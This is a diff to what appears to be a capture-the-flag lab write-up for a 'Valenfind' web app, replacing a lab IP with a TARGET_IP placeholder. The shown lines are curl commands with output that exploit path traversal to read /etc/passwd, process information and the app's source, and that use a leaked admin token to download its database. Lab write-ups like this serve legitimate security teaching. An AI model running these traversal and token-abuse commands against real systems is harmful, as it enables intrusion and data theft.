@@ -331,8 +331,8 @@ Before trying to abuse the endpoint, we capture what it returns when used **nor
 **Command:** 
 
 	`curl "http://TARGET_IP:5000/api/fetch_layout?layout=theme_modern.html"` or 
-	`curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_romance.html"` or 
-	`curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_classic.html"`
+	`curl "http://TARGET_IP:5000/api/fetch_layout?layout=theme_romance.html"` or 
+	`curl "http://TARGET_IP:5000/api/fetch_layout?layout=theme_classic.html"`
 
 **Breakdown:**
 
@@ -350,7 +350,7 @@ Before trying to abuse the endpoint, we capture what it returns when used **nor
 
 ```shell
 ┌──(kali㉿kali)-[~]
-└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_romance.html"                                   
+└─$ curl "http://TARGET_IP:5000/api/fetch_layout?layout=theme_romance.html"                                   
 
         <div class="bio-box romance" style="
             background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%); 
@@ -367,7 +367,7 @@ Before trying to abuse the endpoint, we capture what it returns when used **nor
 
 
 ┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
-└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_modern.html" 
+└─$ curl "http://TARGET_IP:5000/api/fetch_layout?layout=theme_modern.html" 
 
         <div class="bio-box modern" style="
             background: #2f3542; 
@@ -383,7 +383,7 @@ Before trying to abuse the endpoint, we capture what it returns when used **nor
 
 
 ┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
-└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_classic.html"
+└─$ curl "http://TARGET_IP:5000/api/fetch_layout?layout=theme_classic.html"
 
         <div class="bio-box" style="
             background: #ffffff; 
@@ -431,7 +431,7 @@ The universal proof-of-concept target is **`/etc/passwd`** — a text file pre
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
-└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../etc/passwd"
+└─$ curl "http://TARGET_IP:5000/api/fetch_layout?layout=../../../../etc/passwd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -511,7 +511,7 @@ Result:
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
-└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../../../proc/self/cmdline" --output -       
+└─$ curl "http://TARGET_IP:5000/api/fetch_layout?layout=../../../../../../proc/self/cmdline" --output -       
 /usr/bin/python3/opt/Valenfind/app.py   
 ```
 
@@ -535,7 +535,7 @@ With the path known, we point the same path-traversal read at the source file. T
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
-└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../../../opt/Valenfind/app.py"        
+└─$ curl "http://TARGET_IP:5000/api/fetch_layout?layout=../../../../../../opt/Valenfind/app.py"        
 import os
 import sqlite3
 import hashlib
@@ -896,7 +896,7 @@ We bypass the blocklist entirely by calling the admin export route and attaching
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
-└─$ curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" "http://10.49.188.115:5000/api/admin/export_db" --output valenfind_leak.db
+└─$ curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" "http://TARGET_IP:5000/api/admin/export_db" --output valenfind_leak.db
   % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                  Dload  Upload  Total   Spent   Left   Speed
 100  16384 100  16384   0      0  18703      0                              0
